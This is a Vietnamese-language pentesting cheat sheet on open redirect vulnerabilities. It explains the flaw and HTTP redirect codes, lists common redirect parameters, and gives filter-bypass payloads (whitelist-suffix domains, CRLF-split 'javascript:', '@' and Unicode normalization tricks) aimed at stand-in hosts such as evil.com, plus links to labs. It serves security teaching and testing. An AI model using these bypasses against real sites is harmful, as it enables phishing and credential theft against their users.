# Open URL Redirect

> Redirect và forward không được xác thực xảy ra khi một ứng dụng web chấp nhận input không đáng tin cậy, từ đó có thể khiến ứng dụng web chuyển hướng request đến một URL được chứa trong input không đáng tin cậy. Bằng cách sửa đổi URL input không đáng tin cậy thành một trang web độc hại, kẻ tấn công có thể thực hiện thành công một cuộc tấn công phishing và đánh cắp thông tin xác thực của người dùng. Do tên máy chủ trong liên kết đã bị sửa đổi vẫn giống với trang web ban đầu, các cuộc tấn công phishing có thể trông đáng tin cậy hơn. Các cuộc tấn công redirect và forward không được xác thực cũng có thể được sử dụng để tạo một URL độc hại vượt qua kiểm tra kiểm soát truy cập của ứng dụng, sau đó chuyển hướng kẻ tấn công đến các chức năng đặc quyền mà bình thường họ không thể truy cập.

## Tóm tắt

* [Phương pháp](#methodology)

  * [HTTP Redirection Status Code](#http-redirection-status-code)
  * [Các phương thức Redirect](#redirect-methods)

    * [Redirect dựa trên Path](#path-based-redirects)
    * [Redirect dựa trên JavaScript](#javascript-based-redirects)
    * [Các Query Parameter phổ biến](#common-query-parameters)
  * [Bypass bộ lọc](#filter-bypass)
* [Các bài lab](#labs)
* [Tài liệu tham khảo](#references)

## Phương pháp

Lỗ hổng open redirect xảy ra khi một ứng dụng web hoặc máy chủ sử dụng input do người dùng cung cấp mà không xác thực để chuyển hướng người dùng đến các trang web khác. Điều này cho phép kẻ tấn công tạo một liên kết đến trang web dễ bị tổn thương, sau đó chuyển hướng người dùng đến một trang web độc hại do chúng lựa chọn.

Kẻ tấn công có thể tận dụng lỗ hổng này trong các chiến dịch phishing, đánh cắp session hoặc buộc người dùng thực hiện một hành động mà không có sự đồng ý của họ.

**Ví dụ**: Một ứng dụng web có chức năng cho phép người dùng nhấp vào một liên kết và tự động được chuyển hướng đến trang chủ ưa thích đã lưu. Chức năng này có thể được triển khai như sau:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

Kẻ tấn công có thể khai thác open redirect bằng cách thay thế `userpreferredsite.com` bằng một liên kết đến trang web độc hại. Sau đó, chúng có thể phân phối liên kết này thông qua email phishing hoặc một trang web khác. Khi người dùng nhấp vào liên kết, họ sẽ được đưa đến trang web độc hại.

## HTTP Redirection Status Code

Các mã trạng thái HTTP Redirection, bắt đầu bằng số 3, cho biết client cần thực hiện thêm một hành động để hoàn thành request. Một số mã phổ biến:

* [300 Multiple Choices](https://httpstatuses.com/300) - Cho biết request có nhiều response khả thi. Client nên chọn một trong số đó.
* [301 Moved Permanently](https://httpstatuses.com/301) - Cho biết resource được yêu cầu đã được chuyển vĩnh viễn đến URL được cung cấp trong header `Location`. Tất cả request trong tương lai nên sử dụng URI mới.
* [302 Found](https://httpstatuses.com/302) - Cho biết resource được yêu cầu đã tạm thời được chuyển đến URL được cung cấp trong header `Location`. Không giống 301, mã này không có nghĩa resource đã được chuyển vĩnh viễn mà chỉ tạm thời nằm ở một địa chỉ khác.
* [303 See Other](https://httpstatuses.com/303) - Server gửi response này để hướng client lấy resource được yêu cầu tại một URI khác bằng request GET.
* [304 Not Modified](https://httpstatuses.com/304) - Được sử dụng cho mục đích caching. Nó thông báo cho client rằng response chưa thay đổi, vì vậy client có thể tiếp tục sử dụng phiên bản response đang được cache.
* [305 Use Proxy](https://httpstatuses.com/305) - Resource được yêu cầu phải được truy cập thông qua proxy được cung cấp trong header `Location`.
* [307 Temporary Redirect](https://httpstatuses.com/307) - Cho biết resource được yêu cầu đã tạm thời được chuyển đến URL được cung cấp trong header `Location`, và các request trong tương lai vẫn phải sử dụng URI ban đầu.
* [308 Permanent Redirect](https://httpstatuses.com/308) - Cho biết resource đã được chuyển vĩnh viễn và các request trong tương lai nên sử dụng URI mới. Tương tự 301 nhưng không cho phép thay đổi HTTP method.

## Các phương thức Redirect

### Redirect dựa trên Path

Thay vì sử dụng query parameter, logic chuyển hướng có thể dựa trên path:

* Sử dụng dấu slash trong URL: `https://example.com/redirect/http://malicious.com`
* Chèn relative path: `https://example.com/redirect/../http://malicious.com`

### Redirect dựa trên JavaScript

Nếu ứng dụng sử dụng JavaScript để thực hiện redirect, kẻ tấn công có thể thao túng các biến được sử dụng trong script:

**Ví dụ**:

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**Payload**: `?redirectTo=http://malicious.com`

### Các Query Parameter phổ biến

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

## Bypass bộ lọc

* Sử dụng domain hoặc keyword nằm trong whitelist

  ```powershell
  www.whitelisted.com.evil.com redirect to evil.com
  ```

* Sử dụng **CRLF** để bypass keyword `javascript` bị blacklist

  ```powershell
  java%0d%0ascript%0d%0a:alert(0)
  ```

* Sử dụng "`//`" và "`////`" để bypass keyword `http` bị blacklist

  ```powershell
  //google.com
  ////google.com
  ```

* Sử dụng `https:` để bypass "`//`" bị blacklist

  ```powershell
  https:google.com
  ```

* Sử dụng "`\/\/`" để bypass "`//`" bị blacklist

  ```powershell
  \/\/google.com/
  /\/google.com/
  ```

* Sử dụng "`%E3%80%82`" để bypass ký tự "." bị blacklist

  ```powershell
  /?redir=google。com
  //google%E3%80%82com
  ```

* Sử dụng null byte "`%00`" để bypass bộ lọc blacklist

  ```powershell
  //google%00.com
  ```

* Sử dụng HTTP Parameter Pollution

  ```powershell
  ?next=whitelisted.com&next=google.com
  ```

* Sử dụng ký tự "`@`". [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)

  ```powershell
  //<user>:<password>@<host>:<port>/<url-path>
  http://www.theirsite.com@yoursite.com/
  ```

* Tạo folder có tên giống domain của họ

  ```powershell
  http://www.yoursite.com/http://www.theirsite.com/
  http://www.yoursite.com/folder/www.folder.com
  ```

* Sử dụng ký tự "`?`", trình duyệt sẽ chuyển nó thành "`/?`"

  ```powershell
  http://www.yoursite.com?http://www.theirsite.com/
  http://www.yoursite.com?folder/www.folder.com
  ```

* Host/Split Unicode Normalization

  ```powershell
  https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
  http://a.com／X.b.com
  ```

## Các bài lab

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

## Tài liệu tham khảo

* [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://web.archive.org/web/20190819081715/https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
* [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://web.archive.org/web/20190719012735/https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://web.archive.org/web/20180816184136/https://s0cket7.com/open-redirect-vulnerability/)
* [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://web.archive.org/web/20130423163025/https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
